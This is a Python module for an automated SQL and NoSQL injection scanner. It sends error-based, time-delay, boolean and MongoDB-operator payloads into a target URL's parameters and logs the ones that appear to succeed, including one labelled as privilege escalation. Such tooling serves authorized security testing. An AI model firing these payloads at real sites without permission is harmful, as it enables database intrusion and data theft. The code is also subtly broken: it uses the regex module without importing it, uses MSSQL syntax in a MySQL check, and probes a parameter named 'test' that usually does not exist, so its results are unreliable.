import httpx
import asyncio
import logging
import random
import statistics
import time
import json
import hashlib
from typing import Dict, List, Optional, Tuple, Any, Union, Set
from urllib.parse import urlencode, parse_qs, urlparse, quote_plus, unquote_plus
from enum import Enum, auto

class DatabaseType(Enum):
    MYSQL = auto()
    POSTGRESQL = auto()
    MSSQL = auto()
    ORACLE = auto()
    SQLITE = auto()
    MONGODB = auto()
    COUCHDB = auto()
    REDIS = auto()
    UNKNOWN = auto()

class SQLInjectionType(Enum):
    ERROR_BASED = "Error-based"
    TIME_BASED = "Time-based Blind"
    BOOLEAN_BASED = "Boolean-based Blind"
    UNION_BASED = "Union-based"
    STACKED_QUERIES = "Stacked Queries"
    IN_BAND = "In-band"
    OUT_OF_BAND = "Out-of-band"
    NOSQL = "NoSQL Injection"

class Module:
    def __init__(self, url: str, payload_engine, analyzer, verbose: bool = False):
        """Initialize the SQL Injection scanner.
        
        Args:
            url: Target URL to scan
            payload_engine: Payload engine for SQLi payloads
            analyzer: Analysis module for results
            verbose: Enable verbose output
        """
        self.url = url
        self.base_url = self._get_base_url(url)
        self.payload_engine = payload_engine
        self.analyzer = analyzer
        self.verbose = verbose
        self.findings: List[Dict[str, Any]] = []
        self.response_times: List[float] = []
        self.response_hashes: Set[str] = set()
        self.time_threshold: float = 1.0  # Base threshold in seconds
        self.confidence_threshold: float = 0.9  # 90% confidence
        self.detected_db: Optional[DatabaseType] = None
        self.session = httpx.AsyncClient(timeout=30.0, follow_redirects=True)
        
        # Thresholds for boolean-based detection
        self.boolean_threshold = 0.9  # 90% confidence
        self.boolean_tests = 5  # Number of tests to perform for boolean-based
        
        # Common SQL keywords and patterns
        self.sql_keywords = [
            'select', 'insert', 'update', 'delete', 'drop', 'create', 'alter',
            'truncate', 'union', 'and', 'or', 'xor', 'not', 'like', 'between',
            'in', 'exists', 'all', 'any', 'some', 'having', 'group by', 'order by'
        ]
        
        # NoSQL patterns
        self.nosql_patterns = [
            r'\$where', r'\$eq', r'\$ne', r'\$gt', r'\$lt', r'\$gte', r'\$lte',
            r'\$in', r'\$nin', r'\$exists', r'\$type', r'\$mod', r'\$regex',
            r'\$text', r'\$search', r'\$all', r'\$elemMatch', r'\$size',
            r'\$bitsAllClear', r'\$bitsAnyClear', r'\$bitsAllSet', r'\$bitsAnySet'
        ]

    def _get_base_url(self, url: str) -> str:
        """Extract base URL from a given URL."""
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"
        
    async def close(self):
        """Close the HTTP session."""
        if self.session:
            await self.session.aclose()
            
    async def __aenter__(self):
        return self
        
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        await self.close()

    async def run(self):
        """Run SQL injection tests."""
        try:
            # Test for SQLi in URL parameters
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            
            # First, try to identify the database type
            await self._detect_database_type()
            
            # Test each parameter with appropriate payloads
            for param in params:
                if not params[param]:
                    continue
                    
                original_value = params[param][0]
                
                # Test for SQL injection
                await self.test_parameter(param, original_value)
                
                # Test for NoSQL injection if no SQL injection found
                if not any(f['type'] == SQLInjectionType.ERROR_BASED.value for f in self.findings):
                    await self.test_nosql_injection(param, original_value)
                    
        except Exception as e:
            if self.verbose:
                logging.error(f"Error during SQLi scan: {str(e)}")
                
        return self.findings

    async def _detect_database_type(self) -> None:
        """Try to detect the database type using various techniques."""
        if self.detected_db:
            return
            
        # Test with database-specific payloads and analyze responses
        db_tests = {
            DatabaseType.MYSQL: [
                ("' AND 1=CONVERT(INT,@@version)--", r'mysql|maria'),
                ("' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--", r'mysql|maria'),
                ("' AND SLEEP(1)--", None)  # Time-based check
            ],
            DatabaseType.POSTGRESQL: [
                ("' AND 1=CAST(VERSION() AS INT)--", r'postgresql|postgres'),
                ("' AND 1=1--", None)  # Generic test
            ],
            DatabaseType.MSSQL: [
                ("' AND 1=CONVERT(INT,@@VERSION)--", r'sql server|microsoft'),
                ("';WAITFOR DELAY '0:0:5'--", None)  # Time-based check
            ],
            DatabaseType.ORACLE: [
                ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", None),  # Time-based check
                ("' AND 1=UTL_INADDR.get_host_name('test')--", r'oracle')
            ],
            DatabaseType.MONGODB: [
                (r'{"$where": "sleep(5000)"}', None),
                (r'{"$ne": 1}', None)
            ]
        }
        
        for db_type, tests in db_tests.items():
            for payload, pattern in tests:
                try:
                    test_url = self._construct_test_url('test', payload)
                    if not test_url:
                        continue
                        
                    if self.verbose:
                        logging.info(f"Testing for {db_type.name} with payload: {payload}")
                        
                    # Special handling for NoSQL payloads
                    if db_type == DatabaseType.MONGODB:
                        if await self._test_nosql_payload(payload):
                            self.detected_db = db_type
                            if self.verbose:
                                logging.info(f"Detected database type: {db_type.name}")
                            return
                        continue
                        
                    # For SQL payloads
                    start_time = time.time()
                    response = await self.session.get(test_url)
                    response_time = time.time() - start_time
                    
                    # Check time-based detection
                    if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper() or 'DBMS_PIPE' in payload.upper():
                        if response_time > 4:  # If response took more than 4 seconds
                            self.detected_db = db_type
                            if self.verbose:
                                logging.info(f"Detected database type (time-based): {db_type.name}")
                            return
                    
                    # Check error-based detection
                    if pattern and re.search(pattern, response.text, re.IGNORECASE):
                        self.detected_db = db_type
                        if self.verbose:
                            logging.info(f"Detected database type (error-based): {db_type.name}")
                        return
                        
                except Exception as e:
                    if self.verbose:
                        logging.warning(f"Error detecting database type: {str(e)}")
        
        # If we get here, we couldn't determine the database type
        self.detected_db = DatabaseType.UNKNOWN
        if self.verbose:
            logging.warning("Could not determine database type")

    async def test_parameter(self, param: str, original_value: str) -> None:
        """Test a single parameter for SQL injection vulnerabilities.
        
        Args:
            param: The parameter name to test
            original_value: The original parameter value
        """
        # Get payloads for different SQLi types
        payloads = self.payload_engine.get_payloads('sqli')
        
        # Test each payload
        for payload_data in payloads:
            payload = payload_data['payload']
            
            # Skip if payload is not applicable to this parameter
            if not self._is_payload_applicable(payload, original_value):
                continue
                
            # Test for error-based SQLi
            if await self.test_error_based_sqli(param, payload):
                self._add_finding(
                    injection_type=SQLInjectionType.ERROR_BASED,
                    param=param,
                    payload=payload,
                    risk='high',
                    description=f'Error-based SQL injection in parameter {param}'
                )
                
            # Test for boolean-based blind SQLi
            if await self.test_boolean_based_sqli(param, payload):
                # Finding is added in the test_boolean_based_sqli method
                pass
                
            # Test for time-based blind SQLi
            if await self.test_time_based_sqli(param, payload):
                # Finding is added in the test_time_based_sqli method
                pass

    def _is_payload_applicable(self, payload: str, original_value: str) -> bool:
        """Check if a payload is applicable to the original parameter value.
        
        Args:
            payload: The payload to check
            original_value: The original parameter value
            
        Returns:
            bool: True if the payload is applicable
        """
        # Skip empty payloads
        if not payload or not payload.strip():
            return False
            
        # Skip payloads that require numeric values if the original isn't numeric
        if any(x in payload.lower() for x in [' or 1=', ' and 1=', ' or true', ' and true']):
            if not original_value.isdigit() and not original_value.replace('.', '', 1).isdigit():
                return False
                
        # Skip payloads with specific database requirements if we know the DB type
        if self.detected_db != DatabaseType.UNKNOWN:
            if 'pg_sleep' in payload.lower() and self.detected_db != DatabaseType.POSTGRESQL:
                return False
            if 'waitfor delay' in payload.lower() and self.detected_db != DatabaseType.MSSQL:
                return False
                
        return True
    
    async def test_error_based_sqli(self, param: str, payload: str) -> bool:
        """Test for error-based SQL injection vulnerabilities.
        
        Args:
            param: The parameter to test
            payload: The payload to inject
            
        Returns:
            bool: True if error-based SQLi is detected
        """
        test_url = self._construct_test_url(param, payload)
        if test_url is None:
            return False
            
        try:
            # First, get the original response for comparison
            original_response = await self._get_original_response(param)
            if not original_response:
                return False
                
            # Test with the payload
            response = await self.session.get(test_url)
            
            # Check for SQL error messages
            if self._contains_sql_errors(response.text):
                return True
                
            # Check for differences in response
            if self._is_response_different(original_response, response.text, payload):
                return True
                
        except Exception as e:
            if self.verbose:
                logging.error(f"Error testing error-based SQLi on {param}: {str(e)}")
                
        return False
        
    async def test_boolean_based_sqli(self, param: str, payload: str) -> bool:
        """Test for boolean-based blind SQL injection vulnerabilities.
        
        Args:
            param: The parameter to test
            payload: The payload to inject
            
        Returns:
            bool: True if boolean-based blind SQLi is detected
        """
        # Get boolean-based payloads for the detected database
        boolean_payloads = self._get_boolean_payloads(param)
        
        for payload_data in boolean_payloads:
            true_payload = payload_data.get('true')
            false_payload = payload_data.get('false')
            
            if not true_payload or not false_payload:
                continue
                
            try:
                # Get responses for true and false conditions
                true_response = await self._send_boolean_request(param, true_payload)
                false_response = await self._send_boolean_request(param, false_payload)
                
                if not true_response or not false_response:
                    continue
                    
                # Compare the responses
                if self._are_responses_different(true_response, false_response):
                    self._add_finding(
                        injection_type=SQLInjectionType.BOOLEAN_BASED,
                        param=param,
                        payload=f"True: {true_payload}, False: {false_payload}",
                        risk='high',
                        description=f'Boolean-based blind SQL injection in parameter {param}'
                    )
                    return True
                    
            except Exception as e:
                if self.verbose:
                    logging.error(f"Error testing boolean-based SQLi on {param}: {str(e)}")
                
        return False
        
    async def test_time_based_sqli(self, param: str, payload: str) -> bool:
        """Test for time-based blind SQL injection vulnerabilities.
        
        Args:
            param: The parameter to test
            payload: The payload to inject
            
        Returns:
            bool: True if time-based blind SQLi is detected
        """
        # Check if the payload is a time-based payload
        time_based_keywords = ['sleep', 'waitfor', 'benchmark', 'pg_sleep']
        if not any(keyword in payload.lower() for keyword in time_based_keywords):
            return False
            
        try:
            # Get baseline response time
            baseline_time = await self._get_baseline_response_time(param)
            if baseline_time is None:
                return False
                
            # Test with the time-based payload
            test_url = self._construct_test_url(param, payload)
            if not test_url:
                return False
                
            start_time = time.time()
            response = await self.session.get(test_url, timeout=baseline_time * 3)
            elapsed_time = time.time() - start_time
            
            # Check if the response took significantly longer than baseline
            if elapsed_time > baseline_time * 1.5:  # 50% more than baseline
                self._add_finding(
                    injection_type=SQLInjectionType.TIME_BASED,
                    param=param,
                    payload=payload,
                    risk='high',
                    description=f'Time-based blind SQL injection in parameter {param}',
                    response_time=elapsed_time,
                    baseline_time=baseline_time
                )
                return True
                
        except asyncio.TimeoutError:
            # If we hit the timeout, it might indicate a successful time-based injection
            self._add_finding(
                injection_type=SQLInjectionType.TIME_BASED,
                param=param,
                payload=payload,
                risk='high',
                description=f'Potential time-based blind SQL injection in parameter {param} (caused timeout)',
                timeout=True
            )
            return True
            
        except Exception as e:
            if self.verbose:
                logging.error(f"Error testing time-based SQLi on {param}: {str(e)}")
                
        return False
        
    async def test_nosql_injection(self, param: str, original_value: str) -> None:
        """Test for NoSQL injection vulnerabilities.
        
        Args:
            param: The parameter to test
            original_value: The original parameter value
        """
        nosql_payloads = self._get_nosql_payloads()
        
        for payload_data in nosql_payloads:
            payload = payload_data['payload']
            
            try:
                # Test with different content types
                for content_type in [
                    'application/json',
                    'application/x-www-form-urlencoded',
                    'application/xml',
                    'text/plain'
                ]:
                    # Test with different HTTP methods
                    for method in ['GET', 'POST', 'PUT', 'PATCH']:
                        if await self._test_nosql_payload(payload, param, content_type, method):
                            self._add_finding(
                                injection_type=SQLInjectionType.NOSQL,
                                param=param,
                                payload=payload,
                                risk='high',
                                description=f'NoSQL injection in parameter {param} with {content_type}',
                                db_type='MongoDB' if 'mongodb' in str(payload).lower() else 'Other'
                            )
                            return
                            
            except Exception as e:
                if self.verbose:
                    logging.error(f"Error testing NoSQL injection on {param}: {str(e)}")
    
    def _get_boolean_payloads(self, param: str) -> List[Dict[str, str]]:
        """Get boolean-based blind SQLi payloads for the detected database.
        
        Returns:
            List of payload pairs (true/false) for boolean-based testing
        """
        if self.detected_db == DatabaseType.MYSQL:
            return [
                {'true': f"' AND 1=1-- ", 'false': f"' AND 1=2-- "},
                {'true': f"' OR 1=1-- ", 'false': f"' OR 1=2-- "},
                {'true': f"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,VERSION(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
                 'false': f"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--"}
            ]
        elif self.detected_db == DatabaseType.POSTGRESQL:
            return [
                {'true': f"' AND 1=1-- ", 'false': f"' AND 1=2-- "},
                {'true': f"' OR 1=1-- ", 'false': f"' OR 1=2-- "},
                {'true': f"' AND (SELECT 1 FROM pg_sleep(1))--", 'false': f"' AND (SELECT 1 FROM pg_sleep(0))--"}
            ]
        elif self.detected_db == DatabaseType.MSSQL:
            return [
                {'true': f"' AND 1=1--", 'false': f"' AND 1=2--"},
                {'true': f"' OR 1=1--", 'false': f"' OR 1=2--"},
                {'true': f"'; IF (1=1) WAITFOR DELAY '0:0:5'--", 'false': f"'; IF (1=2) WAITFOR DELAY '0:0:5'--"}
            ]
        elif self.detected_db == DatabaseType.ORACLE:
            return [
                {'true': f"' AND 1=1--", 'false': f"' AND 1=2--"},
                {'true': f"' OR 1=1--", 'false': f"' OR 1=2--"},
                {'true': f"' AND (SELECT 1 FROM dual WHERE 1=1)=1--", 'false': f"' AND (SELECT 1 FROM dual WHERE 1=2)=1--"}
            ]
        else:
            # Generic payloads if database type is unknown
            return [
                {'true': f"' AND 1=1--", 'false': f"' AND 1=2--"},
                {'true': f"' OR 1=1--", 'false': f"' OR 1=2--"},
                {'true': f"' OR '1'='1", 'false': f"' OR '1'='2"}
            ]
            
    def _get_nosql_payloads(self) -> List[Dict[str, Any]]:
        """Get NoSQL injection payloads.
        
        Returns:
            List of NoSQL injection payloads with metadata
        """
        return [
            # MongoDB specific
            {
                'payload': '{"$where": "sleep(5000)"}',
                'description': 'MongoDB time-based injection',
                'risk': 'high',
                'db_type': 'MongoDB'
            },
            {
                'payload': '{"$ne": 1}',
                'description': 'MongoDB not equal operator injection',
                'risk': 'medium',
                'db_type': 'MongoDB'
            },
            {
                'payload': '{"$regex": ".*"}',
                'description': 'MongoDB regex injection',
                'risk': 'high',
                'db_type': 'MongoDB'
            },
            
            # Generic NoSQL
            {
                'payload': '{"$gt": ""}',
                'description': 'NoSQL greater than operator injection',
                'risk': 'medium',
                'db_type': 'Generic'
            },
            {
                'payload': '{"$where": "true"}',
                'description': 'NoSQL where clause injection',
                'risk': 'high',
                'db_type': 'Generic'
            },
            
            # CouchDB specific
            {
                'payload': '{"$or": [{"admin": true}]}',
                'description': 'CouchDB privilege escalation',
                'risk': 'critical',
                'db_type': 'CouchDB'
            }
        ]
        
    async def _test_nosql_payload(self, payload: str, param: str = None, 
                               content_type: str = 'application/json', 
                               method: str = 'POST') -> bool:
        """Test a NoSQL injection payload.
        
        Args:
            payload: The payload to test
            param: The parameter to test (if any)
            content_type: The content type to use
            method: The HTTP method to use
            
        Returns:
            bool: True if the payload was successful
        """
        try:
            headers = {'Content-Type': content_type}
            data = {}
            
            # Handle different content types
            if content_type == 'application/json':
                try:
                    # If payload is already a string, try to parse it as JSON
                    if isinstance(payload, str):
                        data = json.loads(payload)
                    else:
                        data = payload
                except (json.JSONDecodeError, TypeError):
                    # If parsing fails, use the payload as is
                    data = {param: payload} if param else payload
            else:
                # For form-urlencoded, we need to handle the payload differently
                if param:
                    data = {param: payload}
                else:
                    # Try to convert JSON to form data
                    try:
                        if isinstance(payload, str):
                            payload_dict = json.loads(payload)
                        else:
                            payload_dict = payload
                        data = {k: json.dumps(v) if isinstance(v, (dict, list)) else str(v) 
                              for k, v in payload_dict.items()}
                    except (json.JSONDecodeError, AttributeError, TypeError):
                        data = {'data': str(payload)}
            
            # Send the request
            response = await self.session.request(
                method=method,
                url=self.url,
                json=data if content_type == 'application/json' else None,
                data=data if content_type != 'application/json' else None,
                headers=headers,
                timeout=10.0
            )
            
            # Check for signs of successful injection
            if self._is_nosql_injection_successful(response, payload):
                return True
                
        except Exception as e:
            if self.verbose:
                logging.error(f"Error testing NoSQL payload: {str(e)}")
                
        return False
        
    def _is_nosql_injection_successful(self, response: httpx.Response, payload: str) -> bool:
        """Check if a NoSQL injection was successful.
        
        Args:
            response: The HTTP response
            payload: The payload that was sent
            
        Returns:
            bool: True if the injection was successful
        """
        # Check for time-based injection
        if 'sleep' in str(payload).lower() or 'wait' in str(payload).lower():
            # This would need to be handled by the calling function
            return False
            
        # Check for boolean-based injection
        if any(op in str(payload) for op in ['$ne', '$gt', '$lt', '$regex']):
            # Look for differences in response
            response_hash = self._get_response_hash(response.text)
            if response_hash not in self.response_hashes:
                self.response_hashes.add(response_hash)
                return True
                
        # Check for error-based injection
        error_indicators = [
            'mongo', 'mongodb', 'syntax error', 'unexpected token',
            'invalid', 'failed', 'error', 'exception', 'unexpected',
            'type error', 'reference error', 'eval error'
        ]
        
        response_text = response.text.lower()
        if any(indicator in response_text for indicator in error_indicators):
            return True
            
        return False
        
    def _get_response_hash(self, text: str) -> str:
        """Get a hash of the response text for comparison."""
        return hashlib.md5(text.encode('utf-8')).hexdigest()
        
    async def _send_boolean_request(self, param: str, payload: str) -> Optional[str]:
        """Send a request with a boolean-based payload.
        
        Args:
            param: The parameter to test
            payload: The payload to send
            
        Returns:
            The response text or None if there was an error
        """
        try:
            test_url = self._construct_test_url(param, payload)
            if not test_url:
                return None
                
            response = await self.session.get(test_url, timeout=10.0)
            return response.text
            
        except Exception as e:
            if self.verbose:
                logging.error(f"Error sending boolean request: {str(e)}")
            return None
            
    def _are_responses_different(self, response1: str, response2: str) -> bool:
        """Check if two responses are significantly different.
        
        Args:
            response1: First response text
            response2: Second response text
            
        Returns:
            bool: True if responses are significantly different
        """
        # Simple length-based comparison
        len_diff = abs(len(response1) - len(response2))
        if len_diff > 100:  # Arbitrary threshold
            return True
            
        # Check for significant content differences
        diff_ratio = self._get_string_similarity_ratio(response1, response2)
        return diff_ratio < 0.8  # 80% similarity threshold
        
    def _get_string_similarity_ratio(self, s1: str, s2: str) -> float:
        """Calculate similarity ratio between two strings.
        
        Args:
            s1: First string
            s2: Second string
            
        Returns:
            float: Similarity ratio between 0.0 and 1.0
        """
        # Simple implementation - can be replaced with more sophisticated algorithm
        # like Levenshtein distance if needed
        if not s1 or not s2:
            return 0.0
            
        # Convert to sets of words for comparison
        set1 = set(s1.split())
        set2 = set(s2.split())
        
        if not set1 and not set2:
            return 1.0
            
        intersection = len(set1.intersection(set2))
        union = len(set1.union(set2))
        
        return intersection / union if union > 0 else 0.0
        
    def _add_finding(self, injection_type: SQLInjectionType, param: str, payload: str,
                   risk: str, description: str, **kwargs) -> None:
        """Add a finding to the results.
        
        Args:
            injection_type: Type of SQL injection
            param: The vulnerable parameter
            payload: The payload that triggered the vulnerability
            risk: Risk level (low, medium, high, critical)
            description: Description of the finding
            **kwargs: Additional metadata
        """
        finding = {
            'type': injection_type.value,
            'url': self.url,
            'parameter': param,
            'payload': payload,
            'risk': risk,
            'cwe': 'CWE-89',  # SQL Injection
            'description': description,
            'database': self.detected_db.name if self.detected_db else 'Unknown',
            **kwargs
        }
        
        # Add to findings if not a duplicate
        if not any(f['parameter'] == param and f['type'] == injection_type.value 
                  for f in self.findings):
            self.findings.append(finding)
            
    async def _get_original_response(self, param: str) -> Optional[str]:
        """Get the original response for a parameter.
        
        Args:
            param: The parameter to test
            
        Returns:
            The response text or None if there was an error
        """
        try:
            test_url = self._construct_test_url(param, '')
            if not test_url:
                return None
                
            response = await self.session.get(test_url, timeout=10.0)
            return response.text
            
        except Exception as e:
            if self.verbose:
                logging.error(f"Error getting original response: {str(e)}")
            return None
            
    def _contains_sql_errors(self, response_text: str) -> bool:
        """Check if the response contains SQL error messages.
        
        Args:
            response_text: The response text to check
            
        Returns:
            bool: True if SQL errors are found
        """
        error_patterns = [
            # MySQL
            r'sql.*syntax', 
            r'mysql.*syntax',
            r'mysql_fetch',
            r'warning.*mysql',
            
            # PostgreSQL
            r'postgresql.*error',
            r'pg_.*error',
            
            # SQL Server
            r'sql server',
            r'microsoft.*sql server',
            r'odbc.*driver',
            r'oledb.*provider',
            
            # Oracle
            'oracle.*error',
            'ora-\d{5}',
            
            # SQLite
            'sqlite.*error',
            'sqlite3.*error',
            
            # Generic
            'syntax.*error',
            'unclosed.*quotes',
            'unterminated.*string',
            'database.*error',
            'query.*failed',
            'sql.*error'
        ]
        
        response_lower = response_text.lower()
        return any(re.search(pattern, response_lower, re.IGNORECASE) 
                  for pattern in error_patterns)
                  
    def _is_response_different(self, original: str, new: str, payload: str) -> bool:
        """Check if the new response is significantly different from the original.
        
        Args:
            original: Original response text
            new: New response text to compare
            payload: The payload that was injected
            
        Returns:
            bool: True if responses are significantly different
        """
        # Check if the payload itself is in the response
        if payload and payload in new and payload not in original:
            return True
            
        # Check for common SQLi indicators in the response
        indicators = [
            'syntax error', 'unexpected end', 'unterminated', 'quoted string',
            'you have an error in your sql syntax', 'warning: mysql',
            'unclosed quotation mark', 'quotes are not properly matched'
        ]
        
        new_lower = new.lower()
        original_lower = original.lower()
        
        # Check if any indicators appear in the new response but not in the original
        for indicator in indicators:
            if indicator in new_lower and indicator not in original_lower:
                return True
                
        # Check for significant content differences
        return self._are_responses_different(original, new)

    async def _get_baseline_response_time(self, param: str, num_samples: int = 3) -> Optional[float]:
        """Get the baseline response time for a parameter.
        
        Args:
            param: The parameter to test
            num_samples: Number of samples to take
            
        Returns:
            The median response time in seconds, or None if an error occurred
        """
        try:
            # Get the base URL without the parameter we're testing
            parsed = urlparse(self.url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Get query parameters
            params = parse_qs(parsed.query, keep_blank_values=True)
            if param not in params:
                return None
                
            # Remove the parameter we're testing
            test_params = {k: v[0] if v else '' for k, v in params.items() if k != param}
            
            # Take multiple samples to get a stable baseline
            response_times = []
            for _ in range(num_samples):
                try:
                    start_time = time.time()
                    response = await self.session.get(base_url, params=test_params, timeout=10.0)
                    response.raise_for_status()
                    response_times.append(time.time() - start_time)
                    
                    # Small delay between requests
                    await asyncio.sleep(0.5)
                except Exception as e:
                    if self.verbose:
                        logging.warning(f"Error in baseline request: {str(e)}")
                    continue
                    
            if not response_times:
                return None
                
            # Return the median response time
            return statistics.median(response_times)
            
        except Exception as e:
            if self.verbose:
                logging.error(f"Error getting baseline response time: {str(e)}")
            return None
        
    def _construct_test_url(self, param: str, payload: str) -> Optional[str]:
        """Construct a test URL with the given payload.
        
        Args:
            param: The parameter to inject into
            payload: The payload to inject
            
        Returns:
            The constructed URL, or None if there was an error
        """
        try:
            parsed = urlparse(self.url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            
            if param not in params and not any(p in param.lower() for p in ['http', 'https', 'ftp', 'ftps']):
                return None
                
            # Replace the parameter value with our payload
            if param in params:
                params[param] = [payload]
            
            # Rebuild the query string
            query = []
            for k, v in params.items():
                if isinstance(v, list):
                    for val in v:
                        query.append(f"{k}={quote_plus(str(val))}")
                else:
                    query.append(f"{k}={quote_plus(str(v))}")
            
            # Handle URL fragments
            fragment = f"#{parsed.fragment}" if parsed.fragment else ""
                    
            # Reconstruct the URL
            query_str = '?' + '&'.join(query) if query else ''
            return f"{parsed.scheme}://{parsed.netloc}{parsed.path}{query_str}{fragment}"
            
        except Exception as e:
            if self.verbose:
                logging.error(f"Error constructing test URL: {str(e)}")
            return None
    async def _test_time_delay(self, url: str) -> Tuple[float, float]:
        """Test for time delay injection.
        
        Args:
            url: URL to test
            
        Returns:
            Tuple of (expected_delay, actual_response_time)
        """
        try:
            start_time = time.time()
            async with httpx.AsyncClient(timeout=15) as client:
                await client.get(url)
            response_time = time.time() - start_time
            
            # Get expected delay from URL parameters
            parsed = urlparse(url)
            query = parse_qs(parsed.query)
            delay = float(query.get('delay', [5])[0])
            
            return delay, response_time
            
        except Exception as e:
            if self.verbose:
                logging.error(f"Error in time delay test: {str(e)}")
            return 0, 0
    
    def _is_time_based_vulnerable(self, baseline: float, expected_delay: float, response_time: float) -> bool:
        """Determine if the response time indicates a time-based vulnerability.
        
        Args:
            baseline: Baseline response time
            expected_delay: Expected delay from payload
            response_time: Actual response time
            
        Returns:
            bool: True if time-based vulnerability is detected
        """
        # If we expected a delay but didn't get one, not vulnerable
        if expected_delay > 0 and response_time < baseline + (expected_delay * 0.5):
            return False
            
        # If response time is significantly higher than baseline, might be vulnerable
        threshold = max(1.0, baseline * 1.5)  # At least 1 second or 1.5x baseline
        return response_time > threshold
    
    def _calculate_confidence(self, baseline: float, expected_delay: float, response_time: float) -> float:
        """Calculate confidence level for time-based detection.
        
        Args:
            baseline: Baseline response time
            expected_delay: Expected delay from payload
            response_time: Actual response time
            
        Returns:
            float: Confidence level between 0 and 1
        """
        if expected_delay <= 0:
            return 0.0
            
        # Calculate how much longer the response was than expected
        delay_difference = max(0, response_time - baseline)
        confidence = min(1.0, delay_difference / expected_delay)
        
        # Apply a minimum threshold
        return max(0.0, min(1.0, confidence))